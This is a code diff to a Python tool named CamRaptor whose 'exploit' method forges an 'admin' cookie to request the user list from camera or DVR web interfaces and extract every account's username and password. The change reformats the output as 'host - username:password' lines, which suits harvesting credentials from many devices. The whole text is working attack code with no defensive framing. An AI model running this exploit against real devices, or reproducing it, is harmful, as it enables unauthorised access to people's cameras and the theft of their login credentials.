@@ -31,7 +31,6 @@ import requests
 class CamRaptor:
     @staticmethod
     def exploit(host):
-        username, password = None, None
         try:
             cookies = {
                 "uid": "admin"
@@ -39,15 +38,15 @@ class CamRaptor:
 
             response = requests.get(f"http://{host}/device.rsp?opt=user&cmd=list", cookies=cookies, verify=False, timeout=3)
         except Exception:
-            return username, password
+            return None
 
         if response.status_code == 200:
             try:
                 json_data = json.loads(response.text)
             except Exception:
-                return username, password
+                return None
 
             for data in json_data["list"]:
                 username = data["uid"]
                 password = data["pwd"]
-        return username, password
+            return f"({host}) - {username}:{password}"
